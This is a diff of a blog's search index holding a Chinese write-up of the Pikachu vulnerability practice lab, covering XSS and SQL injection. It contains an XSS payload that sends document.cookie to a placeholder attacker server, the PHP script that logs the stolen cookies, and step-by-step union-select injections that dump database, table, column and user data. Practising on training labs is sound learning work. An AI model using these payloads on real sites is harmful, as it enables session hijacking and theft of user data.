@@ -4,7 +4,7 @@
     
     <entry>
       <title><![CDATA[Pikachu 漏洞练习平台]]></title>
-      <url>/2019/08/14/xss-csrf%E5%AD%A6%E4%B9%A0/</url>
+      <url>/2019/08/14/pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0/</url>
       <content type="html"><![CDATA[<p><a href="https://bbs.pediy.com/thread-246122.htm" target="_blank" rel="noopener">了解一下?</a></p>
 <a id="more"></a>
 <h1 id="Pikachu-漏洞练习平台"><a href="#Pikachu-漏洞练习平台" class="headerlink" title="Pikachu 漏洞练习平台"></a>Pikachu 漏洞练习平台</h1><p>下面的演示中, 攻击者与被攻击者使用同一台服务器, ip地址使用<code>ipadd</code>代替</p>
@@ -26,7 +26,7 @@
 </ul>
 <p>这个js文件可以在页面中追加一个图片资源, 并且指向我们自己的一台服务器的某个文件(即下面的<code>index.php</code>)并向其发送参数. </p>
 <ul>
-<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$time = time();</span><br><span class="line"></span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">$referer = $_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$txt = date(&quot;Y/m/d-h:i:s&quot;).&quot; ip=&quot;.$ip.&quot;  cookie=&quot;.$cookie.&quot; referer=&quot;.$referer.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo $txt;</span><br><span class="line">file_put_contents(&quot;log.txt&quot;,$txt,FILE_APPEND);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$cookie = $_GET[<span class="string">'cookie'</span>];</span></span><br><span class="line"><span class="php">$time = time();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span class="php">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span></span><br><span class="line"><span class="php">$txt = date(<span class="string">"Y/m/d-h:i:s"</span>).<span class="string">" ip="</span>.$ip.<span class="string">"  cookie="</span>.$cookie.<span class="string">" referer="</span>.$referer.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php">file_put_contents(<span class="string">"log.txt"</span>,$txt,FILE_APPEND);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
@@ -84,10 +84,48 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onmouseover</span>=<span class="string">" var img = new Image(); img.src = 'http://ipadd:999/myxss/index.php?cookie=' + document.cookie; document.body.append(img);"</span>&gt;</span></span><br><span class="line">        "'what do you see?"</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>当鼠标经过图片时, 我的服务器上就已经获取了用户的cookie.</p>
+<h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>因为输入框的数字被限定在了1-6, 所以需要抓包改数据. 最好使用<code>burp suite</code>的 <code>Repeater</code>功能来多次发送payload.<br>可以令<code>id=1 or 1</code>, 这样所有的where 子句布尔值都为真, 可以遍历出, 所有的数据.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hello,vince  </span><br><span class="line">your email is: vince@pikachu.com  </span><br><span class="line">hello,allen   </span><br><span class="line">your email is: allen@pikachu.com  </span><br><span class="line">hello,kobe   </span><br><span class="line">your email is: kobe@pikachu.com  </span><br><span class="line">hello,grady   </span><br><span class="line">your email is: grady@pikachu.com  </span><br><span class="line">hello,kevin  </span><br><span class="line">your email is: kevin@pikachu.com  </span><br><span class="line">hello,lucy  </span><br><span class="line">your email is: lucy@pikachu.com  </span><br><span class="line">hello,lili  </span><br><span class="line">your email is: lili@pikachu.com</span><br></pre></td></tr></table></figure>
+
+<p>如果题目的mysql查询语句后加上<code>LIMIT 0,1</code>或你想爆出数据库更多的数据就不会这么简单了, 可以用我之间的<a href="http://tjuyjn.top/2019/07/11/sqli-lab%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/">sqli-lab</a>里总结的方法, 如下:</p>
+<ol>
+<li>令<code>id=2-1</code>, 发现和<code>id=1</code>时相同, 确定这是数字型.</li>
+<li>令<code>id=0</code>, 查询结果集为空.</li>
+<li>令<code>id=0 union select 1,2</code>, 查询结果为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello, 1  </span><br><span class="line">your email is:2</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>这表明结果集为两列.</p>
+<ul>
+<li>令<code>id=0 union select database(),(select group_concat(schema_name) from information_schema.schemata)--+</code><br>结果为(无关数据已打码)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,pikachu </span><br><span class="line">your email is: information_schema,xxxxx,mysql,performance_schema,xxxx,pikachu,xxxxxxxxx...</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>这样就获得了题目使用的数据库和所有数据库</p>
+<ol start="4">
+<li>令<code>id=0 union select 2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;pikachu&#39;)--+</code>, 结果为:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,2</span><br><span class="line">your email is: httpinfo,member,message,users,xssblind</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>这样得到了该数据库的表名.</p>
+<ol start="5">
+<li>令<code>id=0 union select 2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;member&#39;)--+</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your email is: id,username,pw,sex,phonenum,address,email</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>得到<code>users</code>的所有列名.</p>
+<ol start="6">
+<li>令<code>id=0 union select (select group_concat(username) from pikachu.member),(select group_concat(email) from pikachu.member)--+</code>爆出<code>username</code>和<code>email</code>这两个字段.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,vince,allen,kobe,grady,kevin,lucy,lili</span><br><span class="line">your email is: vince@pikachu.com,allen@pikachu.com,kobe@pikachu.com,grady@pikachu.com,kevin@pikachu.com,lucy@pikachu.com,lili@pikachu.com</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>和上题类似, 只是字符型需要考虑闭合.<br>这里是用<code>&#39;</code>闭合.</p>
 ]]></content>
       
         
         <tags>
+            
+            <tag> sql注入 </tag>
             
             <tag> xss </tag>
             
